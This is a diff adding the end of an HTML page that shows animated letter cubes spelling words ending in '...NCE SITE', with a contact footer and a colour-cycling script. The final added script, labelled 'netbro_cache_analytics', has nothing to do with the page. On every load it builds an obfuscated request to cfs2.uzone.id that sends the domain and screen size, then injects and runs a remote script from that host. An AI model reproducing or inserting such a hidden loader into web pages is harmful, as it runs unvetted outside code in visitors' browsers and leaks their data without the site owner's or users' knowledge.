+					<div class="cube">
+						<div class="side side1">
+							<div class="letter">N</div>
+						</div>
+						<div class="side side2">
+							<div class="letter">N</div>
+						</div>
+						<div class="side side3">
+							<div class="letter">N</div>
+						</div>
+						<div class="side side4">
+							<div class="letter">N</div>
+						</div>
+						<div class="side side5">
+							<div class="letter">N</div>
+						</div>
+						<div class="side side6">
+							<div class="letter">N</div>
+						</div>
+					</div>
+				</div>
+				<div class="container">
+					<div class="cube">
+						<div class="side side1">
+							<div class="letter">C</div>
+						</div>
+						<div class="side side2">
+							<div class="letter">C</div>
+						</div>
+						<div class="side side3">
+							<div class="letter">C</div>
+						</div>
+						<div class="side side4">
+							<div class="letter">C</div>
+						</div>
+						<div class="side side5">
+							<div class="letter">C</div>
+						</div>
+						<div class="side side6">
+							<div class="letter">C</div>
+						</div>
+					</div>
+				</div>
+				<div class="container">
+					<div class="cube">
+						<div class="side side1">
+							<div class="letter">E</div>
+						</div>
+						<div class="side side2">
+							<div class="letter">E</div>
+						</div>
+						<div class="side side3">
+							<div class="letter">E</div>
+						</div>
+						<div class="side side4">
+							<div class="letter">E</div>
+						</div>
+						<div class="side side5">
+							<div class="letter">E</div>
+						</div>
+						<div class="side side6">
+							<div class="letter">E</div>
+						</div>
+					</div>
+				</div>
+			</div>
+			<div class="word">
+				<div class="container">
+					<div class="cube">
+						<div class="side side1">
+							<div class="letter">S</div>
+						</div>
+						<div class="side side2">
+							<div class="letter">S</div>
+						</div>
+						<div class="side side3">
+							<div class="letter">S</div>
+						</div>
+						<div class="side side4">
+							<div class="letter">S</div>
+						</div>
+						<div class="side side5">
+							<div class="letter">S</div>
+						</div>
+						<div class="side side6">
+							<div class="letter">S</div>
+						</div>
+					</div>
+				</div>
+				<div class="container">
+					<div class="cube">
+						<div class="side side1">
+							<div class="letter">I</div>
+						</div>
+						<div class="side side2">
+							<div class="letter">I</div>
+						</div>
+						<div class="side side3">
+							<div class="letter">I</div>
+						</div>
+						<div class="side side4">
+							<div class="letter">I</div>
+						</div>
+						<div class="side side5">
+							<div class="letter">I</div>
+						</div>
+						<div class="side side6">
+							<div class="letter">I</div>
+						</div>
+					</div>
+				</div>
+				<div class="container">
+					<div class="cube">
+						<div class="side side1">
+							<div class="letter">T</div>
+						</div>
+						<div class="side side2">
+							<div class="letter">T</div>
+						</div>
+						<div class="side side3">
+							<div class="letter">T</div>
+						</div>
+						<div class="side side4">
+							<div class="letter">T</div>
+						</div>
+						<div class="side side5">
+							<div class="letter">T</div>
+						</div>
+						<div class="side side6">
+							<div class="letter">T</div>
+						</div>
+					</div>
+				</div>
+				<div class="container">
+					<div class="cube">
+						<div class="side side1">
+							<div class="letter">E</div>
+						</div>
+						<div class="side side2">
+							<div class="letter">E</div>
+						</div>
+						<div class="side side3">
+							<div class="letter">E</div>
+						</div>
+						<div class="side side4">
+							<div class="letter">E</div>
+						</div>
+						<div class="side side5">
+							<div class="letter">E</div>
+						</div>
+						<div class="side side6">
+							<div class="letter">E</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<p class="f"><a target="_blank" href="https://www.facebook.com/agoenks29D/">Contact</a><br /> iam@agungdirgantara.id</p>
+		<script>
+			'use strict';
+			
+			var faces = document.getElementsByClassName('side');
+			var COLORS = ['#f4f3d2', '#F1515C', '#22D4BE', '#433D3A'];
+			var BORDER_STYLE = ['solid', 'dashed'];
+			
+			var getRandomInt = function getRandomInt(min, max) {
+			return Math.floor(Math.random() * (max - min + 1)) + min;
+			};
+			var removeElementFromArray = function removeElementFromArray(element, array) {
+			var arr = [].concat(array);
+			var index = arr.indexOf(element);
+			if (index > -1) arr.splice(index, 1);
+			return arr;
+			};
+			var getRandomElm = function getRandomElm() {
+			var arr = arguments.length <= 0 || arguments[0] === undefined ? COLORS : arguments[0];
+			return arr[getRandomInt(0, arr.length - 1)];
+			};
+			window.setInterval(function () {
+			var i = undefined;
+			var backgroundColor = getRandomElm();
+			var newColorArray = removeElementFromArray(backgroundColor, COLORS);
+			var fontColor = getRandomElm(newColorArray);
+			var borderTextColor = getRandomElm();
+			var randomColors = Math.random() > 0.6;
+			var border = {
+			width: getRandomInt(0, 3) + 'px',
+			style: getRandomElm(BORDER_STYLE),
+			color: getRandomElm()
+			};
+			for (i = 0; i < faces.length; i++) {
+			if (randomColors) {
+			  backgroundColor = getRandomElm();
+			  newColorArray = removeElementFromArray(backgroundColor, COLORS);
+			  fontColor = getRandomElm(newColorArray);
+			}
+			faces[i].style.color = fontColor;
+			faces[i].style.backgroundColor = backgroundColor;
+			faces[i].style.borderColor = border.color;
+			faces[i].style.borderWidth = border.width;
+			faces[i].style.borderStyle = border.style;
+			faces[i].style.textShadow = '1px 0 0 ' + borderTextColor + ', -(1px) 0 0 ' + borderTextColor + ', 0 1px 0 ' + borderTextColor + ', 0 -(1px) 0 ' + borderTextColor + ', 1px 1px ' + borderTextColor + ', -1px -1px 0 ' + borderTextColor + ', 1px -1px 0 ' + borderTextColor + ', -1px 1px 0 ' + borderTextColor;
+			}
+			}, 150);
+		</script>
+		<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssK3jjB%2f6124aY3fYrswmSTJpk6MJikIsiXWPsWVeW5aKedPEO2hroTA7zAxcocH%2fxU3L6t4V9fUhhlA9mjNNP78VgxyUP8PHs3y%2f7aS0L%2fupmSO0AKP2Pm1GrfTZm50gdbrI1OZSly0wH%2btvPxV4ziKidSvdqOB7Umym5dZ6Y0Mq%2bMv9Rr4Dg%2bAuP3zQV3Rv8esgsHIARauOIPk9zwPKkxyb%2bCbp3vKFF7UXk%2bfm0ppq0R3uAHoQW8UmXaJyXHRsvCuY%2frDIIE91EPURAA3NH1CpeMad8cgr0WjbD8pfK16d7ot8l9cJpuNrKqKuKIhknUPeJdZMKniJnw%2bIcpOLm3YHj7%2fCRp7Ty7V%2b2o2kmTI72NBi2nhFwocU%2b3FNmxriNKLdJVZCR7YChdmX06p%2fGUvnZCOBT3Zm7weUh7lRjZnW2qlHUyUynDu7Pq%2bTeRCeOHdRDoIwadz4bH%2fCF3SvgVltekt3fY8r8c4r8pA4B%2b432L3Nv7dV%2fWUVg4G6ztwaKMLod%2f5ln2SGYe7ZNmXqbw3MJqC7MUv%2bcjK%2b9UxUaVMmqaBuHPMd2CMg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
+	</body>
+</html>
